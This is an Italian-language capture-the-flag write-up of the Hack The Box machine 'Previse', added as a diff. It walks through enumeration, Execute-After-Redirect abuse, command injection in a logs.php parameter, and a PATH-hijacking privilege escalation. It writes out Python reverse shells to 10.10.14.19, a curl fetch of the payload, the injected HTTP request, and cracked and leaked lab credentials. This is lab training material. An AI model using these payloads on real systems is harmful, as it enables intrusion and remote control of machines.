@@ -1,0 +1,323 @@
+#+TITLE: HTB - Previse
+#+AUTHOR: Leonardo Tamiano
+
+* Enumeration
+** nmap
+*** nmap -sC -sV previse
+  #+begin_example
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-15 19:19 CET
+Nmap scan report for previse (10.129.95.185)
+Host is up (0.059s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
+|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
+|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-title: Previse Login
+|_Requested resource was login.php
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.or
+g/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.50 seconds
+
+  #+end_example
+*** nmap -p- previse
+  #+begin_example
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-15 19:20 CET
+Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 51.87% done; ETC: 19:20 (0:00:26 remaining)
+Nmap scan report for previse (10.129.95.185)
+Host is up (0.052s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 42.47 seconds
+
+  #+end_example
+** gobuster
+*** gobuster dir -w ~/repos/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://previse -x php
+  #+begin_example
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://previse
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/leo/repos/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2022/02/15 19:22:28 Starting gobuster in directory enumeration mode
+===============================================================
+/login.php            (Status: 200) [Size: 2224]
+/files.php            (Status: 302) [Size: 4914] [--> login.php]
+/download.php         (Status: 302) [Size: 0] [--> login.php]   
+/index.php            (Status: 302) [Size: 2801] [--> login.php]
+/header.php           (Status: 200) [Size: 980]                 
+/nav.php              (Status: 200) [Size: 1248]                
+/footer.php           (Status: 200) [Size: 217]                 
+/css                  (Status: 301) [Size: 300] [--> http://previse/css/]
+/status.php           (Status: 302) [Size: 2966] [--> login.php]         
+/js                   (Status: 301) [Size: 299] [--> http://previse/js/] 
+/logout.php           (Status: 302) [Size: 0] [--> login.php]            
+/accounts.php         (Status: 302) [Size: 3994] [--> login.php]         
+/config.php           (Status: 200) [Size: 0]                            
+/logs.php             (Status: 302) [Size: 0] [--> login.php]            
+Progress: 44544 / 441122 (10.10%)                                       ^C
+[!] Keyboard interrupt detected, terminating.
+                                                                         
+===============================================================
+2022/02/15 19:26:38 Finished
+===============================================================
+
+  #+end_example
+
+** www
+   Il server è vulnerabile ad una *Execute After Redirect* (EAR), che ci
+   permette di leggere il codice delle pagine a cui non abbiamo
+   accesso.
+
+*** /accounts.php
+   Per exploitare questa EAR possiamo utilizzare la seguente richiesta
+   POST, che ci permette di creare un nuovo account ~leonardo:12345~.
+
+   #+begin_example
+POST /accounts.php HTTP/1.1
+Host: previse
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=6q3edkuufbam2s9j3i9hegp5f4
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+
+username=leonardo&password=12345&confirm=12345
+   #+end_example
+*** RCE
+    Analizzando il backup .zip del sito trovato in ~files.php~ abbiamo
+    scoperto una RCE nel file ~logs.php~ e in particolare in come viene
+    gestito il parametro ~delim~ utilizzato per generare i log con un
+    dato separatore.
+    
+    #+begin_example
+/////////////////////////////////////////////////////////////////////////////////////
+//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
+/////////////////////////////////////////////////////////////////////////////////////
+
+$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
+echo $output;    
+    #+end_example
+    
+    Un payload che funziona per iniettare del codice bash che verrà
+    poi eseguito con la ~exec~ è il seguente
+    
+    #+begin_example
+    space ; <COMMAND>
+    #+end_example
+
+    -------------------------------
+    
+    Per ottenere una rev shell ci basta copiare il seguente codice
+    python in un file chiamato ~python3.py~
+    
+    #+begin_src python
+import socket,subprocess,os;
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.14.19",4321));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);    
+    #+end_src
+
+    apriamo un web server sempre con ~python3 -m http.server 1337~ e
+    lanciamo due richieste con i seguenti valori nel parametro ~delim~
+    
+    #+begin_example
+    space ; curl http://10.10.14.19:1337/python3.py > /tmp/shell.py
+    space ; /usr/bin/python /tmp/shell.py 
+    #+end_example
+    
+    Ad esempio, la prima richiesta sarà questa
+    
+    #+begin_example
+POST /logs.php HTTP/1.1
+Host: previse
+Content-Length: 75
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://previse
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://previse/file_logs.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=6q3edkuufbam2s9j3i9hegp5f4
+Connection: close
+
+delim=space+%3b+curl+http%3a//10.10.14.19%3a1337/python3.py+>+/tmp/shell.py    
+    #+end_example
+    
+    Così facendo otteniamo una shell remota.
+* PrivEsc
+
+  #+begin_example
+  m4lwhere:ilovecody112235!
+  #+end_example
+
+** www-data@previse:/var/www/html$ cat config.php
+   #+begin_example
+<?php
+
+function connectDB(){
+    $host = 'localhost';
+    $user = 'root';
+    $passwd = 'mySQL_p@ssw0rd!:)';
+    $db = 'previse';
+    $mycon = new mysqli($host, $user, $passwd, $db);
+    return $mycon;
+}
+
+?>   
+   #+end_example
+
+** mysql
+   root:mySQL_p@ssw0rd!:)
+   
+   #+begin_src sh
+mysql -u root -h localhost -p   
+   #+end_src
+
+*** mysql> select * from accounts;
+
+    #+begin_example
++----+----------+------------------------------------+---------------------+
+| id | username | password                           | created_at          |
++----+----------+------------------------------------+---------------------+
+|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
+|  2 | leonardo | $1$🧂llol$eBQMPwAvz9j9ZpK62qDI// | 2022-02-15 18:30:35 |
++----+----------+------------------------------------+---------------------+
+2 rows in set (0.00 sec)    
+    #+end_example
+** john
+*** john pass.txt --format="md5crypt-long" --wordlist=~/repos/wordlists/rockyou.txt  
+    #+begin_example
+    m4lwhere:ilovecody112235!
+    #+end_example
+
+** www-data -> m4lwhere 
+   Prendere password hashata dal database, notando che il codice php
+   eseguiva la funzione ~crypt~
+   
+   ~login.php~
+   
+   #+begin_example
+$users = $result->fetch_assoc();
+$passHash = $users['password'];
+if (crypt($password, '$1$🧂llol$') == $passHash) {
+ // ...
+}   
+   #+end_example
+
+   e vedendo la documentazione di PHP rispetto alla funzione ~crypt~
+   https://www.php.net/manual/en/function.crypt.php notiamo che
+
+   #+begin_example
+   CRYPT_MD5 - MD5 hashing with a twelve character salt starting with $1$
+   #+end_example
+   
+   Dato che il nostro hash iniziava con $1$ abbiamo un hash ~md5~ che
+   può essere craccato con
+   
+   #+begin_example
+john pass.txt --format="md5crypt-long" --wordlist=~/repos/wordlists/rockyou.txt     
+   #+end_example
+** sudo -l
+   #+begin_example
+User m4lwhere may run the following commands on previse:
+   (root) /opt/scripts/access_backup.sh   
+   #+end_example
+   
+** /opt/scripts/log_process.py
+   #+begin_src python
+import pandas as pd
+from sys import argv
+
+if argv[1] == 'space':
+    delims = ' '
+elif argv[1] == 'tab':
+    delims = '\t'
+else:
+    delims = ','
+
+df = pd.read_csv('/var/www/file_access.log', 
+                index_col='time', 
+                names=['time', 'user', 'fileID'])
+df.to_csv('/var/www/out.log', sep=delims)   
+   #+end_src
+
+** m4lwhere@previse:/opt/scripts$ cat access_backup.sh
+   #+begin_src sh
+#!/bin/bash
+
+# We always make sure to store logs, we take security SERIOUSLY here
+
+# I know I shouldnt run this as root but I cant figure it out programmatically on my account
+# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time
+
+gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
+gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz   
+   #+end_src
+** m4lwhere -> root
+   L'idea è quella di attaccare lo script
+   ~/opt/scripts/access_backup.sh~ che è vulnerabile ad una ~PATH
+   exploitation~ nei binari ~gzip~ e ~date~.
+
+   Per attaccare possiamo procedere come segue:
+
+   1. Creiamo un payload malevolo in ~/tmp~ chiamato ~gzip~
+      
+      #+begin_src sh
+echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.19\",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > gzip      
+      #+end_src
+
+   2. Modifichiamo la ~PATH~ dell'utente
+      
+      #+begin_src sh
+export PATH=/tmp:$PATH      
+      #+end_src
+
+   3. Mi metto in ascolto
+      
+      #+begin_src sh
+nc -lvnp 4321      
+      #+end_src
+
+   4. Eseguo lo script vulnerabile come root tramite la configurazione
+      presente nei ~sudoers~
+      
+      #+begin_src sh
+sudo  /opt/scripts/access_backup.sh    
+      #+end_src
